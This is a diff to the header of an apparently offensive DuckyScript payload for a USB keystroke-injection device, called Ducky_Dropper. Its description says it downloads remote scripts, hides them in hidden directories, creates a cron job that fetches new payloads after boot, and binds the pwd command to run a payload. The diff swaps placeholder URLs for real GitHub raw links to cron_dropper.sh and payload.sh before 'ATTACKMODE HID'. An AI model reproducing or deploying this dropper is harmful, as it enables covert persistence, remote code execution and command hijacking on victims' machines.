@@ -5,8 +5,8 @@ REM DESCRIPTION: --> See README.md for full information <--
 REM DESCRIPTION: This is the delivery system for the initial gathering and setup of Ducky_Dropper (cron_dropper.sh and payload.sh). It gathers the scripts, gives them execution permissions, places them in hidden directories, creates a cronjob that will call for new payloads 60 seconds after machine boot (cron_dropper.sh), and binds the pwd command to execute payload.sh.
 REM DESCRIPTION: The source to your cron_dropper.sh script must be added to line 8 and source to your payload added to line 9. Ducky_Dropper scripts have been added for demonstration purposes, replace with your own.
 
-DEFINE #CRON_DROPPER https://raw.githubusercontent.com/place/source/to/payload/here
-DEFINE #PAYLOAD https://raw.githubusercontent.com/place/source/to/payload/here
+DEFINE #CRON_DROPPER https://raw.githubusercontent.com/OSINTI4L/DuckyScript-Payloads/refs/heads/main/Payloads/Ducky_Dropper/cron_dropper.sh
+DEFINE #PAYLOAD https://raw.githubusercontent.com/OSINTI4L/DuckyScript-Payloads/refs/heads/main/Payloads/Ducky_Dropper/payload.sh
 
 REM Begin attack:
 ATTACKMODE HID
